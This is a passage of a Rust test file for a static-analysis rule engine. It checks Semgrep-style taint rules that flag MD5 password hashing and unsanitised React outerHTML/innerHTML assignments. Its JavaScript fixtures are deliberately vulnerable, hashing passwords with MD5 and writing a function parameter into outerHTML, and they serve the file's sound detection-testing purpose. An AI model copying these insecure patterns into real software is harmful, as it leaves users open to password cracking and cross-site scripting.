            "shlex-quoted + undecorated helper must NOT fire, got {findings:?}"
        );
    }
    // ── JS md5-used-as-password: inline `createHash("md5")` provenance source ──

    const MD5_PASSWORD_RULE: &str = r#"
id: md5-used-as-password
mode: taint
languages: [javascript]
severity: WARNING
message: MD5 used as a password hash.
pattern-sources:
- pattern: $CRYPTO.createHash("md5")
pattern-sinks:
- patterns:
  - pattern: $FUNCTION(...);
  - metavariable-regex:
      metavariable: $FUNCTION
      regex: (?i)(.*password.*)
"#;

    /// The source compiles to `LiteralArgCall { createHash, md5 }` and the sink
    /// to the password-name `CallRegex`.
    #[test]
    fn md5_password_compiles_to_literal_arg_call_source() {
        let r = compiled(MD5_PASSWORD_RULE);
        assert_eq!(r.spec.sources.len(), 1);
        match &r.spec.sources[0] {
            GenericMatcher::LiteralArgCall { method, arg, .. } => {
                assert_eq!(method, "createHash");
                assert_eq!(arg, "md5");
            }
            other => panic!("expected LiteralArgCall source, got {other:?}"),
        }
        assert!(matches!(
            r.spec.sinks.as_slice(),
            [GenericMatcher::CallRegex { .. }]
        ));
    }

    /// FIRES on an inline `createHash("md5")` digest flowing into a
    /// `*password*` sink; SILENT on `sha256` and on unrelated clean code.
    #[test]
    fn md5_password_fires_on_md5_only() {
        use crate::engine::parser::parse_file;
        let r = compiled(MD5_PASSWORD_RULE);

        let vuln = r#"
function ex1(user, pwtext) {
    var digest = crypto.createHash("md5").update(pwtext).digest("hex");
    user.setPassword(digest);
}
"#;
        let tree = parse_file(vuln, Language::JavaScript).unwrap();
        assert_eq!(r.check(vuln, &tree).len(), 1, "md5 → setPassword must fire");

        // sha256 is the safe near-miss: the literal-arg discriminator excludes it.
        let safe = r#"
function ok1(user, pwtext) {
    var digest = crypto.createHash("sha256").update(pwtext).digest("hex");
    user.setPassword(digest);
}
"#;
        let tree = parse_file(safe, Language::JavaScript).unwrap();
        assert!(
            r.check(safe, &tree).is_empty(),
            "sha256 must NOT fire (algorithm discriminator)"
        );

        // md5 hash flowing into a NON-password sink stays silent.
        let other_sink = r#"
function f(user, pwtext) {
    var digest = crypto.createHash("md5").update(pwtext).digest("hex");
    console.log(digest);
}
"#;
        let tree = parse_file(other_sink, Language::JavaScript).unwrap();
        assert!(
            r.check(other_sink, &tree).is_empty(),
            "md5 → non-password sink must NOT fire"
        );
    }

    // ── JS react-unsanitized-property: metavariable DOM property-assign sink ──

    const REACT_UNSAN_RULE: &str = r#"
id: react-unsanitized-property
mode: taint
languages: [javascript, typescript]
severity: WARNING
message: Detection of $HTML from non-constant definition.
pattern-sources:
  - patterns:
      - pattern-either:
          - pattern-inside: |
              function ...({..., $X, ...}) { ... }
          - pattern-inside: |
              function ...(..., $X, ...) { ... }
      - focus-metavariable: $X
      - pattern-either:
          - pattern: $X.$Y
          - pattern: $X[...]
pattern-sinks:
- patterns:
  - pattern-either:
    - pattern-inside: |
        $BODY = findDOMNode(...)
        ...
  - pattern-either:
    - pattern: |
        $BODY. ... .$HTML = $SINK
    - pattern: |
        $BODY.$HTML = $SINK
  - metavariable-regex:
      metavariable: $HTML
      regex: (innerHTML|outerHTML)
  - focus-metavariable: $SINK
- patterns:
  - pattern-either:
    - pattern: ReactDOM.findDOMNode(...).$HTML = $SINK
  - metavariable-regex:
      metavariable: $HTML
      regex: (innerHTML|outerHTML)
  - focus-metavariable: $SINK
"#;

    /// The metavariable-property sink enumerates the `(innerHTML|outerHTML)`
    /// regex into concrete `MemberAssign` sinks (no other property fires).
    #[test]
    fn react_unsan_enumerates_member_assign_sinks() {
        let r = compiled(REACT_UNSAN_RULE);
        let mut fields: Vec<String> = r
            .spec
            .sinks
            .iter()
            .map(|m| match m {
                GenericMatcher::MemberAssign { field, .. } => field.clone(),
                other => panic!("expected MemberAssign sink, got {other:?}"),
            })
            .collect();
        fields.sort();
        fields.dedup();
        assert_eq!(fields, vec!["innerHTML", "outerHTML"]);
    }

    /// FIRES when a function-parameter property flows into `.outerHTML`;
    /// SILENT on a constant RHS and on unrelated clean code.
    #[test]
    fn react_unsan_fires_on_tainted_html_only() {
        use crate::engine::parser::parse_file;
        let r = compiled(REACT_UNSAN_RULE);

        let vuln = r#"
function Test2(input) {
    ReactDOM.findDOMNode(this.someRef).outerHTML = input.value;
}
"#;
        let tree = parse_file(vuln, Language::JavaScript).unwrap();
        assert_eq!(
            r.check(vuln, &tree).len(),
            1,
            "tainted param → outerHTML must fire"
        );

        // Constant RHS is the safe near-miss.
        let safe = r#"
function OkTest2() {
    ReactDOM.findDOMNode(this.someRef).outerHTML = "<a href='/about.html'>About</a>";
}
"#;
        let tree = parse_file(safe, Language::JavaScript).unwrap();
        assert!(
            r.check(safe, &tree).is_empty(),
            "constant RHS must NOT fire"
        );

        // A non-enumerated property (`textContent`) never fires.
        let other_prop = r#"
function f(input) {
    el.textContent = input.value;
}
"#;
        let tree = parse_file(other_prop, Language::JavaScript).unwrap();
        assert!(
            r.check(other_prop, &tree).is_empty(),
            "non-HTML property must NOT fire"
        );
    }
}
